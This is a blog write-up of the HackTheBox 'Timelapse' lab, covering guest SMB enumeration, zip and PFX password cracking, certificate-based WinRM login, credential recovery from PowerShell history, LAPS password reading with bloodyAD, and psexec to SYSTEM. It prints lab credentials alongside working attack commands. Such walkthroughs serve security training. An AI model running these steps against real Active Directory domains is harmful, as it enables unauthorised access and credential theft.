---
title: "Timelapse HackTheBox" 
date: 2026-1-29 17:30:00 0000+
tags: [WriteUp, Timelapse, HTB, Enumeration, Active Directory, RID Bruteforcing, faketime, zip cracking, pfx, LAPS, Hash Cracking, Lateral Movement, Bloodhound, SMB, bloodyAD, Privilege Escalation,Openssl, Psexec, Windows]
categories: [WriteUps, HackTheBox]
image:          
  path: /assets/images/Timelapse_HTB/preview_timelapse.png
---

# TimeLapse HackTheBox

`Timelapse` is an Easy `Windows` machine, which involves accessing a publicly accessible SMB share that contains a zip file. This zip file requires a password which can be cracked by using John. Extracting the zip file outputs a password encrypted `PFX file`, which can be cracked with John as well, by converting the `PFX file` to a hash format readable by John. From the PFX file an SSL certificate and a private key can be extracted, which is used to login to the system over WinRM. After authentication we discover a PowerShell history file containing login credentials for the `svc_deploy` user. User enumeration shows that `svc_deploy` is part of a group named `LAPS_Readers`. The `LAPS_Readers` group has the ability to manage passwords in LAPS and any user in this group can read the local passwords for machines in the domain. By abusing this trust we retrieve the password for the Administrator and gain a WinRM session.

![image.png](/assets/images/Timelapse_HTB/image.png)

## Initial Enumeration

### Rustmap

We start off with rustmap to find the open ports and services running on the box.

```bash
rustmap.py -ip 10.129.200.134
```

![image.png](/assets/images/Timelapse_HTB/image%201.png)

![image.png](/assets/images/Timelapse_HTB/image%202.png)

From the scan we have a numerous ports open namely `DNS, SMB, KERBEROS, LDAP, WSMAN` etc which indicates that it is an Active Directory Box.

Nmap also identifies the domain controller being `DC01` and the domain being `timelapse.htb`

I will add DC01.TIMELAPSE.HTB and TIMELAPSE.HTB to our `/etc/hosts` file.

Proceeding with the SMB enumeration.

### SMB Enumeration

Lets enumerate SMB and see if any share is guest readable since we dont have any valid credentials across the domain.

```bash
nxc smb timelapse.htb -u '.' -p '' --shares
```

![image.png](/assets/images/Timelapse_HTB/image%203.png)

We have a `Shares` share which is world readable.

Connecting to the share using SMBCLIENT.

```bash
smbclient //dc01.timelapse.htb/Shares -U '.'%
```

![image.png](/assets/images/Timelapse_HTB/image%204.png)

We have successful authentication with the `Shares` share.

![image.png](/assets/images/Timelapse_HTB/image%205.png)

We have some files present in this share lets download them all.

![image.png](/assets/images/Timelapse_HTB/image%206.png)

Successfully downloaded them to our local machine, lets now enumerate further to see if we catch credentials that authenticate to the domain.

## Exploitation

### ZIP Cracking

In the `Dev` folder we have a winrm_backup.zip file which when we try to unzip asks for a password we can crack it using JTR

![image.png](/assets/images/Timelapse_HTB/image%207.png)

Using zip2john to convert the file to a crack able JTR hash.

```bash
zip2john winrm_backup.zip
```

![image.png](/assets/images/Timelapse_HTB/image%208.png)

Cracking it.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![image.png](/assets/images/Timelapse_HTB/image%209.png)

Unzipping it.

![image.png](/assets/images/Timelapse_HTB/image%2010.png)

We now have a .pfx file.

Leaving the .pfx file for the future reference

### RID Brute forcing

Lets first get all the users on the domain with the RID Cycling attack.

```bash
nxc smb timelapse.htb -u '.' -p '' --rid-brute
```

![image.png](/assets/images/Timelapse_HTB/image%2011.png)

Saving all the users to a users.txt file.

Lets now move to our .PFX file and inspect it.

### The .PFX Inspection

Lets try to extract data from the .pfx file and see what we can find.

```bash
openssl pkcs12 -info -in legacyy_dev_auth.pfx
```

![image.png](/assets/images/Timelapse_HTB/image%2012.png)

Lets try to crack the .pfx file with John using pfx2john since it requires a password to open.

```bash
pfx2john legacyy_dev_auth.pfx
```

![image.png](/assets/images/Timelapse_HTB/image%2013.png)

Lets crack this hash using JTR.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pfxhash.hash
```

![image.png](/assets/images/Timelapse_HTB/image%2014.png)

### Extracting Certificate and Private Key.

Lets now enter the import password.

```bash
openssl pkcs12 -info -in legacyy_dev_auth.pfx
```

![image.png](/assets/images/Timelapse_HTB/image%2015.png)

![image.png](/assets/images/Timelapse_HTB/image%2016.png)

Now lets extract the certificate and the private key from the .pfx file using `Openssl`.

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.pem
```

![image.png](/assets/images/Timelapse_HTB/image%2017.png)

We have the certificate for the `legacyy` user. 

Lets now extract the private key

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.pem
```

![image.png](/assets/images/Timelapse_HTB/image%2018.png)

Now we have both the `cert.pem` and `key.pem`, lets now try to login.

### Shell as Legacyy

Using `evil-winrm-py` to login as legacyy user.

```bash
evil-winrm-py -u legacyy --priv-key-pem key.pem --cert-pem cert.pem --ssl -i 10.129.200.134
```

![image.png](/assets/images/Timelapse_HTB/image%2019.png)

We can get `user.txt` this way.

Now I will upload a `sharphound.exe` to know more info about the domain.

### Bloodhound

Uploaded Sharphound to collect the domain information.

```powershell
.\SharpHound.exe -c All
```

![image.png](/assets/images/Timelapse_HTB/image%2020.png)

Downloaded and unzip the .zip ldap data in our Bloodhound instance.

Marking all the users that we own.

![image.png](/assets/images/Timelapse_HTB/image%2021.png)

Unfortunately we have only 1 outbound connection from the Legacyy user and that is `PSRemote` which is already active.

### Shell as SVC_Deploy

Now every user has his Powershell history stored in a file known as `ConsoleHost_History.txt` which stores all the commands executed on a powershell.

As `legacyy` user reading the history file gives us these details.

```powershell
cat C:\Users\legacyy\appdata\roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

![image.png](/assets/images/Timelapse_HTB/image%2022.png)

we now have credentials for the `svc_deploy` user, marking him as owned in bloodhound and checking the outbound object control from this user.

Validating the credentials using NetExec.

```bash
nxc smb timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

![image.png](/assets/images/Timelapse_HTB/image%2023.png)

### Shell as Administrator

And from the bloodhound we have this.

![image.png](/assets/images/Timelapse_HTB/image%2024.png)

This means we can use `bloodyAD` to find the `Local Administrator password` for the Administrator account stored in the `ms-mcs-admpwd` attribute.

```bash
bloodyAD -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.129.227.113 msldap laps
```

![image.png](/assets/images/Timelapse_HTB/image%2025.png)

We can get this way too.

```bash
bloodyAD -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.129.227.113 get search --filter samaccountname='dc01$' --attr='ms-mcs-admpwd'
```

![image.png](/assets/images/Timelapse_HTB/image%2026.png)

Validating the password for the administrator.

```bash
nxc smb timelapse.htb -u 'Administrator' -p 'dv2irh/jqU497.a}8p])Quvl' --shares
```

![image.png](/assets/images/Timelapse_HTB/image%2027.png)

Lets now request a TGT

```bash
faketime -f '+8h' getTGT.py timelapse.htb/Administrator:'dv2irh/jqU497.a}8p])Quvl'
```

![image.png](/assets/images/Timelapse_HTB/image%2028.png)

Now lets do a `psexec` to get a shell on the box as the `NT/AUTHORITY SYSTEM`.

```bash
faketime -f '+8h' psexec.py -k -no-pass dc01.timelapse.htb
```

![image.png](/assets/images/Timelapse_HTB/image%2029.png)

However the `root.txt` file was not on the Administrator’s desktop it was found to be on TRX user’s Desktop.

```powershell
get-childitem -path c:\users\ -filter "root.txt" -recurse -erroraction silentlycontinue
```

![image.png](/assets/images/Timelapse_HTB/image%2030.png)

Rooted !

![image.png](/assets/images/Timelapse_HTB/image%2031.png)

Thanks for Reading 😊✌️
